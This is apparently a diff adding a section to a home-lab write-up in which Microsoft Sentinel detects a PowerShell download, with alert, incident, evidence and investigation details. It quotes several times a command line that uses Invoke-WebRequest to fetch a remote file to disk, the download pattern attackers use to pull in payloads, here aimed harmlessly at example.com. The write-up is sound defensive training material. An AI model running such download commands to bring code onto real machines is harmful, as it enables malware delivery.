@@ -3717,3 +3717,278 @@ If successful and left undetected, this attack could lead to:
 
 
 ---
+
+# 🚨 PowerShell Download Detection
+
+## 🎯 Detection Overview
+
+This detection demonstrates Microsoft Sentinel identifying a **PowerShell Download** execution. Attackers frequently use built-in Windows tools like PowerShell to fetch malicious payloads from external command and control (C2) servers.
+
+The analytics rule automatically identified the suspicious PowerShell command parameters used to initiate a web request and generated a **High severity alert**, allowing SOC analysts to investigate the potential command and control (C2) activity and payload delivery.
+
+---
+
+## 📖 Attack Scenario
+
+"Living off the land" (LOTL) techniques often leverage PowerShell's `Invoke-WebRequest` cmdlet (or aliases like `iwr`, `wget`) to download second-stage malware directly to the file system. Instead of dropping a bulky executable, the attacker executes a lightweight command that reaches out to an external server to fetch the payload.
+
+Microsoft Sentinel detected this activity by monitoring process execution logs for specific PowerShell cmdlets and arguments designed to pull a remote file (`https://example.com`) and save it locally (`C:\Temp\test.html`).
+
+---
+
+# 🚨 Alert Generated
+
+## Alert Summary
+
+| Property | Value |
+|----------|-------|
+| **Alert Name** | PowerShell Download |
+| **Severity** | High |
+| **Status** | New |
+| **Classification** | Not Set |
+| **Detection Source** | NRT rules |
+| **Service Source** | Microsoft Sentinel |
+| **Categories** | Command and Control |
+| **Analytics Rule** | PowerShell Download |
+
+---
+
+## Alert Description
+
+The alert was triggered after Microsoft Sentinel detected PowerShell execution used specifically to download files from remote locations.
+
+The specific command line observed was:
+`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Invoke-WebRequest https://example.com -OutFile C:\Temp\test.html"`
+
+The activity involved:
+
+- 👤 **Account:** `Vm1\Sia123`
+- 💻 **Computer:** `Vm1`
+
+---
+
+## Alert Workflow
+
+```text
+Attacker gains access / executes command
+          │
+          ▼
+Executes PowerShell to download file
+(Command and Control / Ingress Tool Transfer)
+          │
+          ▼
+Network request to external URL
+          │
+          ▼
+Payload downloaded to local disk
+          │
+          ▼
+Microsoft Sentinel NRT Analytics Rule
+          │
+          ▼
+High Severity Alert Generated
+          │
+          ▼
+Microsoft Defender Incident Created
+```
+
+---
+
+## 📸 Alert Overview
+
+> *(Insert Alert Overview Screenshot)*
+
+---
+
+## 📸 Alert Details
+
+> *(Insert Alert Details Screenshot)*
+
+---
+
+## 📸 Query Results
+
+> *(Insert Query Results Screenshot)*
+
+---
+
+# 🚔 Incident Created
+
+## Incident Summary
+
+| Property | Value |
+|----------|-------|
+| **Incident ID** | 58 |
+| **Incident Name** | PowerShell Download |
+| **Severity** | High |
+| **Status** | Active |
+| **Classification** | Unclassified |
+| **Assigned To** | Unassigned |
+| **Active Alerts** | 1 |
+| **Created Automatically** | Yes |
+
+---
+
+## Incident Correlation
+
+Microsoft Defender automatically created Incident 58 based on the Near Real-Time (NRT) detection alert from Microsoft Sentinel. 
+
+This incident provides the analyst with the necessary workspace to investigate the command execution, the target URL, and the impacted endpoint.
+
+---
+
+## 📸 Incident Overview
+
+> *(Insert Incident Overview Screenshot)*
+
+---
+
+# 🕸️ Attack Story
+
+The Attack Story provides a visual relationship between the entities involved in the incident.
+
+Microsoft Defender associated:
+
+- 👤 **User:** `Vm1\Sia123`
+- 💻 **Device:** `Vm1`
+- ⚙️ **Process:** `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Comman...`
+
+This allows analysts to quickly understand the execution chain on the affected endpoint and the account that ran the command.
+
+---
+
+## 📸 Attack Story
+
+> *(Insert Attack Story Screenshot)*
+
+---
+
+# 🔍 Investigation Graph
+
+The Investigation Graph automatically maps the entities associated with the incident.
+
+### Observed Entities
+
+| Entity Type | Entity |
+|-------------|--------|
+| **User** | `Vm1\Sia123` |
+| **Device** | `Vm1` |
+| **Process** | `powershell.exe` |
+
+The graph allows the SOC analyst to visually pivot between the host, the executing user, and the process during the investigation.
+
+---
+
+## 📸 Investigation Graph
+
+> *(Insert Investigation Graph Screenshot)*
+
+---
+
+# 💻 Impacted Assets
+
+The incident identified the following impacted assets.
+
+## Device
+
+| Property | Value |
+|----------|-------|
+| **Device name** | `Vm1` |
+| **Risk Level** | None |
+
+---
+
+## User
+
+| Property | Value |
+|----------|-------|
+| **User** | `Vm1\Sia123` |
+
+---
+
+## 📸 Impacted Device
+
+> *(Insert Device Screenshot)*
+
+---
+
+## 📸 Impacted User
+
+> *(Insert User Screenshot)*
+
+---
+
+# 🧪 Evidence & Response
+
+Microsoft Defender identified a suspicious process execution as part of the evidence.
+
+The query results provided important forensic information regarding the event timeline and execution context.
+
+| Property | Value |
+|----------|-------|
+| **Entity Type** | Process |
+| **Verdict** | Suspicious |
+| **Account** | `Vm1\Sia123` |
+| **Computer** | `Vm1` |
+| **Time Generated** | Jul 25, 2026 11:07:57 PM |
+| **Command Line** | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Invoke-WebRequest https://example.com -OutFile C:\Temp\test.html"` |
+
+---
+
+## 📸 Evidence & Response
+
+> *(Insert Evidence Screenshot)*
+
+---
+
+# 📋 Activities
+
+The Activities tab records automated actions performed during the incident lifecycle.
+
+For this incident:
+
+- 🚨 Alert 'PowerShell Download' was automatically correlated to incident 58.
+- 🤖 Activities were performed by Microsoft Defender XDR via automated triggers.
+
+The activity history provides an audit trail of the automated incident workflow.
+
+---
+
+## 📸 Activities
+
+> *(Insert Activities Screenshot)*
+
+---
+
+# 🛡️ SOC Analyst Investigation
+
+During investigation the analyst should:
+
+- 🔎 Verify the legitimacy of the target URL (`https://example.com`).
+- 🌐 Review network and proxy logs to determine if the connection to the URL was successful and if data was actually downloaded.
+- 📁 Inspect the file system for the presence of the downloaded file (`C:\Temp\test.html`) and analyze it for malicious content or secondary scripts.
+- 👤 Confirm if the user `Vm1\Sia123` authorized this activity.
+- ⚙️ Identify the parent process that spawned the PowerShell instance to uncover the initial access vector (e.g., cmd.exe, a malicious document, or an RDP session).
+- 🔍 Search for subsequent execution of the downloaded file.
+- 🚨 Isolate the affected endpoint (`Vm1`) if malicious payload execution is confirmed.
+
+---
+
+# 🎯 Security Impact
+
+A PowerShell download command indicates that an attacker (or unauthorized software) is attempting to pull additional tools or payloads into the environment. 
+
+Detecting this behavior allows SOC analysts to intercept an attack in its early stages before the primary payload is executed.
+
+If successful, this attack chain could lead to:
+
+- 📥 Execution of Malware (Ransomware, RATs, Info Stealers)
+- 📡 Establishing Command and Control (C2) Communication
+- 🔄 Lateral Movement preparation
+- 🛡️ Establishing Persistence within the environment
+
+---
+
+⬆️ [**Back to Detection Validation Summary**](https://github.com/SAI1813q/Microsoft-Sentinel-SOC-Lab/blob/main/Detection/README.md#-detection-validation-summary)
+
+---
